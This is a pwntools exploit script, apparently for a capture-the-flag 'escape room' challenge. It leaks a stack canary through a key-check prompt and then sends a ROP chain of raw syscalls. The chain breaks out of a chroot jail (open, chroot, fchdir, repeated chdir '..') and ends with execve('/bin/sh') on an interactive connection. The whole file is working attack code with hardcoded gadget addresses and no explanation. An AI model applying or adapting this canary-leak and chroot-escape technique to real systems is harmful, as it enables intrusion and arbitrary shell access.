from pwn import *
from ctypes import CDLL
import time

libc = CDLL("libc.so.6")
elf = ELF("./prob_patched")

context.binary = elf
# context.log_level = 'debug'/

def key_gen():
    return libc.rand() % 0x5f + 0x20

p = remote('chal.h4c.cddc2025.xyz', 61738)
# p = remote("172.17.0.3", 35001)
# p = process(stdout=PIPE)
for i in range(3):
    p.sendlineafter(b'>] ', b'StageOneOfEscapeRoom')
    p.sendlineafter(b'Give me key of Stage1 : ', b'a')
p.sendlineafter(b'>] ', b'StageOneOfEscapeRoom')
p.recvuntil(b'Stage1 Key : ')
key = p.recvuntil(b'\n[>]', drop=True)
canary = u64(b'\x00' + key[-8:-1])
print(hex(canary))
p.sendlineafter(b'Give me key of Stage1 : ', key[:5])
syscall = 0x00000000004242c6
mov_qword_rdi_rdx = 0x000000000043cf43
pop_rdi = 0x0000000000402ecf
pop_rdx = 0x000000000046d362
pop_rax = 0x0000000000459ac7
pop_rsi = 0x000000000040b1be
xchg_edx_eax = 0x00000000004afc0a
payload = flat(
    b'a' * 520, canary,
    b'a' * 8, pop_rdi,
    elf.symbols['map'], pop_rdx,
    b'.'.ljust(8, b'\x00'), mov_qword_rdi_rdx,
    pop_rax, 2,
    pop_rsi, 0,
    pop_rdx, 0,
    syscall,

    pop_rax, 161,
    pop_rdx, b'bin'.ljust(8, b'\x00'), mov_qword_rdi_rdx,
    syscall,

    pop_rdi, 3,
    pop_rax, 81, 
    syscall,

    pop_rdx, b'..'.ljust(8, b'\x00'),
    pop_rdi, elf.symbols['map'],
    mov_qword_rdi_rdx,
    pop_rax, 80,
    syscall,

    pop_rdx, b'..'.ljust(8, b'\x00'),
    pop_rdi, elf.symbols['map'],
    mov_qword_rdi_rdx,
    pop_rax, 80,
    syscall,

    pop_rax, 161,
    pop_rdx, b'.'.ljust(8, b'\x00'), mov_qword_rdi_rdx,
    syscall,

    pop_rdi, elf.symbols['map'],
    pop_rdx, b'/bin/sh\x00', mov_qword_rdi_rdx,
    pop_rax, 59,
    pop_rdx, 0,
    pop_rsi, 0,
    syscall
)
# gdb.attach(p, "break *stage2+420")
p.sendlineafter(b' : ', str(len(payload) + 1).encode())
p.sendlineafter(b': ', payload)
p.interactive()